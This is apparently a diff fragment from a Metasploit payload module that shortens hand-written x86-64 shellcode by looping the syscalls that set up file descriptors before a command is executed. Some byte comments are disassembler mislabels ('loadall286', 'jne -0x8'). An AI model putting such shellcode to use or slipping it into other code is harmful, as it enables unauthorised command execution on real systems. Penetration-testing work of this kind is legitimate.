@@ -77,14 +77,13 @@ module MetasploitModule
       "\x5A" +                                     # pop rdx
       "\x0F\x05" +                                 # loadall286
       "\x4C\x89\xE7" +                             # mov rdi,r12
-      "\x31\xc0" +                                 # xor eax,eax
-      "\x83\xc0\x5A" +                             # add eax,0x5a
-      "\x48\x31\xF6" +                             # xor rsi,rsi
+      "\x6A\x03" +                                 # push byte +0x3
+      "\x5E" +                                     # pop rsi
+      "\x48\xFF\xCE" +                             # dec rsi
+      "\x6A\x5A" +                                 # push +byte 0x5a
+      "\x58" +                                     # pop rax
       "\x0F\x05" +                                 # loadall286
-      "\x31\xc0" +                                 # xor eax,eax
-      "\x83\xc0\x5A" +                             # add eax,0x5a
-      "\x48\xFF\xC6" +                             # inc rsi
-      "\x0F\x05" +                                 # loadall286
+      "\x75\xF6" +                                 # jne -0x8
       "\x31\xc0" +                                 # xor eax,eax
       "\x83\xc0\x3B" +                             # add eax,0x3b
       call +                                       # call CMD.len
